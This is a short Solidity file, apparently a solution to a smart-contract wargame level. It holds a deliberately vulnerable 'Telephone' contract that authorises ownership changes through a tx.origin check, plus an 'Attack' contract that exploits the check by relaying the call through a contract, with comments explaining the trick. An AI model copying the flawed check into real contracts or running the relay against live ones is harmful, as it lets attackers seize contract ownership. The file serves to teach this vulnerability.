// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Attack {

Telephone telephone = Telephone(0xA2d13c49470E30Efe68F3C7E26a1CFae39eD4B86);

// this fun is called by my address = msg.sender(parth)
// therfore the tx.origin = my address = msg.sender(parth)
// when this attack fuction will call telephone.changeOwner func at that time
// msg.sender will be Attack contract address, but the EOA will be my address
// therefore tx.origin = my address = parth and the msg.sender = attack contract address
// so here the owner will set new owner as per the logic

 function attack(address _owner) public {
     telephone.changeOwner(_owner);
}

}


contract Telephone {

  address public owner;

  constructor() {
    owner = msg.sender;
  }

  function changeOwner(address _owner) public {
    if (tx.origin != msg.sender) {
      owner = _owner;
    }
  }
}